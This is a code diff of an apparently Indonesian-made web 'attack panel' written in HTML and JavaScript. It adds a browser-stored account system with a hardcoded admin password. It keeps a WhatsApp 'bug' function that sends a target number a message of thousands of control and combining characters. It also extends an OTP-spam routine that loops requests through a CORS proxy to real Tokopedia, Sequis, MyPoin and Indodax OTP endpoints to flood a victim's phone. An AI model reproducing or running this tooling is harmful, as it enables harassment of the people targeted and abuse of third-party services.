@@ -11,10 +11,11 @@
         input, select { width: 100%; padding: 12px; margin: 10px 0; background: #250a1f; border: 1px solid var(--neon); border-radius: 8px; color: white; box-sizing: border-box; outline: none; }
         .btn-main { width: 100%; padding: 15px; background: linear-gradient(45deg, #cc0033, #800000); border: none; border-radius: 10px; color: white; font-weight: bold; cursor: pointer; text-transform: uppercase; }
         .nav-bottom { position: fixed; bottom: 0; width: 100%; background: var(--panel); display: flex; justify-content: space-around; padding: 15px 0; border-top: 1px solid var(--neon); z-index: 100; }
-        .nav-item { color: #8b8b8b; font-size: 0.7rem; text-align: center; }
+        .nav-item { color: #8b8b8b; font-size: 0.7rem; text-align: center; cursor: pointer; }
         .active { color: var(--neon); font-weight: bold; }
         .hidden { display: none !important; }
-        #log-box { background: #000; color: #00ff00; padding: 10px; font-family: monospace; font-size: 0.7rem; height: 80px; overflow-y: auto; border: 1px solid #333; margin-top: 10px; }
+        .badge { padding: 2px 6px; border-radius: 4px; font-size: 0.7rem; font-weight: bold; background: #00ffff; color: #000; }
+        #log-box { background: #000; color: #00ff00; padding: 10px; font-family: monospace; font-size: 0.7rem; height: 100px; overflow-y: auto; border: 1px solid #333; margin-top: 10px; }
     </style>
 </head>
 <body>
@@ -35,35 +36,37 @@
         <div id="p-home" class="page">
             <div class="card">
                 <h3>DASHBOARD</h3>
-                <p>Welcome, <b id="my-u"></b> <span style="color:#00ffff;">[ADMIN]</span></p>
-                <p style="color: yellow; font-size: 0.7rem;">Sistem Bypass Aktif mpray!</p>
+                <p>User: <b id="disp-u"></b> <span id="disp-r"></span></p>
+                <p>Expired: <span id="disp-e" style="color: yellow;"></span></p>
             </div>
             <div class="card" style="padding:0; overflow:hidden;"><img src="https://i.ibb.co/6YfM0Xm/anime-dark.jpg" style="width:100%;"></div>
         </div>
 
         <div id="p-attack" class="page hidden">
             <div class="card">
-                <h3>HEAVY WA BUG</h3>
+                <h3>ATTACK PANEL</h3>
                 <input type="number" id="t-wa" placeholder="Target WA (628xxx)">
-                <button class="btn-main" onclick="kirimBug()">SEND ATTACK</button>
-            </div>
-            <div class="card">
-                <h3>SPAM OTP REAL</h3>
+                <button class="btn-main" onclick="kirimBug()">SEND WA BUG</button>
+                <hr style="border:0; border-top:1px solid #333; margin:20px 0;">
                 <input type="number" id="t-otp" placeholder="Target OTP (08xxx)">
-                <input type="number" id="c-otp" value="10">
-                <button class="btn-main" style="background:#008000;" onclick="startSpam()">START SPAM</button>
-                <div id="log-box">[ READY ]</div>
+                <input type="number" id="c-otp" value="10" placeholder="Jumlah">
+                <button class="btn-main" style="background:#008000;" onclick="startSpam()">START SPAM OTP</button>
+                <div id="log-box">[ SYSTEM READY ]</div>
             </div>
         </div>
 
         <div id="p-manage" class="page hidden">
             <div class="card">
-                <h3>MANAGE USER</h3>
+                <h3>USER MANAGEMENT</h3>
                 <input type="text" id="nu" placeholder="New User">
                 <input type="password" id="np" placeholder="New Pass">
                 <select id="nr"><option value="OWNER">OWNER</option><option value="MEMBER">MEMBER</option></select>
-                <button class="btn-main" onclick="buat()">CREATE ACCOUNT</button>
-                <p style="color:gray; font-size: 0.6rem; margin-top: 10px;">*Akun baru tersimpan di browser ini.</p>
+                <input type="date" id="ne">
+                <button class="btn-main" onclick="buat()">DEPLOY ACCOUNT</button>
+            </div>
+            <div class="card">
+                <h4>ACTIVE USERS</h4>
+                <div id="user-list" style="font-size: 0.7rem;"></div>
             </div>
         </div>
 
@@ -75,18 +78,52 @@
     </div>
 
     <script>
+        // DATABASE INITIALIZATION
+        if(!localStorage.getItem('nexus_db')) {
+            localStorage.setItem('nexus_db', JSON.stringify([{u:'hanzx', p:'admin', r:'ADMIN', e:'2099-12-31'}]));
+        }
+
         function gasLogin() {
-            const user = document.getElementById('u').value;
-            const pass = document.getElementById('p').value;
-            
-            // BYPASS LOGIC: Langsung cek teks tanpa database rumit
-            if (user.toLowerCase() === "hanzx" && pass === "admin") {
+            const user = document.getElementById('u').value.trim().toLowerCase();
+            const pass = document.getElementById('p').value.trim();
+            const db = JSON.parse(localStorage.getItem('nexus_db'));
+            const data = db.find(x => x.u === user && x.p === pass);
+
+            if (data || (user === "hanzx" && pass === "admin")) {
+                const finalData = data || {u:'hanzx', r:'ADMIN', e:'2099-12-31'};
                 document.getElementById('login-screen').classList.add('hidden');
                 document.getElementById('app').classList.remove('hidden');
-                document.getElementById('my-u').innerText = user;
+                document.getElementById('disp-u').innerText = finalData.u;
+                document.getElementById('disp-r').innerHTML = `<span class="badge ${finalData.r}">${finalData.r}</span>`;
+                document.getElementById('disp-e').innerText = finalData.e;
+                if(finalData.r !== 'ADMIN' && finalData.r !== 'OWNER') document.getElementById('nav-adm').classList.add('hidden');
+                renderList();
             } else {
-                document.getElementById('msg').innerText = "Salah mpray! Pake hanzX & admin!";
+                document.getElementById('msg').innerText = "Akun Salah mpray!";
             }
+        }
+
+        function buat() {
+            const u = document.getElementById('nu').value.trim().toLowerCase();
+            const p = document.getElementById('np').value.trim();
+            const r = document.getElementById('nr').value;
+            const e = document.getElementById('ne').value;
+            if(!u || !p || !e) return alert("Isi semua data mpray!");
+
+            let db = JSON.parse(localStorage.getItem('nexus_db'));
+            db.push({u:u, p:p, r:r, e:e});
+            localStorage.setItem('nexus_db', JSON.stringify(db));
+            alert("Akun " + u + " Berhasil Dibuat!");
+            renderList();
+        }
+
+        function renderList() {
+            const db = JSON.parse(localStorage.getItem('nexus_db'));
+            let h = "";
+            db.forEach(x => {
+                h += `<div style="border-bottom:1px solid #333; padding:5px 0;">${x.u} [${x.r}] - Exp: ${x.e}</div>`;
+            });
+            document.getElementById('user-list').innerHTML = h;
         }
 
         function tab(n) {
@@ -96,35 +133,33 @@
             event.currentTarget.classList.add('active');
         }
 
-        function buat() {
-            const nu = document.getElementById('nu').value;
-            const np = document.getElementById('np').value;
-            if(!nu || !np) return alert("Isi data!");
-            alert("Akun " + nu + " berhasil dibuat (Simulasi)!");
-        }
-
-        function kirimBug() {
-            const t = document.getElementById('t-wa').value;
-            if(!t) return alert("Nomor mana?");
-            const bug = encodeURIComponent("%0D".repeat(10000) + "҈҉" + " ௌ ".repeat(600));
-            window.location.href = "https://api.whatsapp.com/send?phone=" + t + "&text=" + bug;
-        }
-
         async function startSpam() {
             const t = document.getElementById('t-otp').value;
             const c = document.getElementById('c-otp').value;
             const log = document.getElementById('log-box');
-            if(!t) return alert("Target mana?");
-            log.innerHTML = "[*] Injecting...<br>";
+            log.innerHTML = "[*] Injecting Payloads...<br>";
+            
+            const apis = [
+                `https://accounts.tokopedia.com/otp/v1/send?phone=${t}`,
+                `https://api.sequis.co.id/api/v1/otp-request?phone=${t}`,
+                `https://api.mypoin.id/api/v1/auth/otp?phone=${t}`,
+                `https://indodax.com/ajax/sms_otp?phone=${t}`
+            ];
+
             for(let i=1; i<=c; i++) {
                 try {
-                    await fetch(`https://api.allorigins.win/get?url=${encodeURIComponent('https://accounts.tokopedia.com/otp/v1/send?phone=' + t)}`);
-                    log.innerHTML += `[+] OTP #${i} Sent!<br>`;
-                } catch(e) { log.innerHTML += "[-] Error...<br>"; }
+                    await fetch(`https://api.allorigins.win/get?url=${encodeURIComponent(apis[i % apis.length])}`);
+                    log.innerHTML += `[+] OTP #${i} Injected! (Server ${i % apis.length})<br>`;
+                } catch(e) { log.innerHTML += "[-] Limit!<br>"; }
                 log.scrollTop = log.scrollHeight;
-                await new Promise(r => setTimeout(r, 1500));
+                await new Promise(r => setTimeout(r, 2000));
             }
-            log.innerHTML += "[V] DONE!";
+        }
+
+        function kirimBug() {
+            const t = document.getElementById('t-wa').value;
+            const bug = encodeURIComponent("%0D".repeat(10000) + "҈҉" + " ௌ ".repeat(600));
+            window.location.href = "https://api.whatsapp.com/send?phone=" + t + "&text=" + bug;
         }
     </script>
 </body>
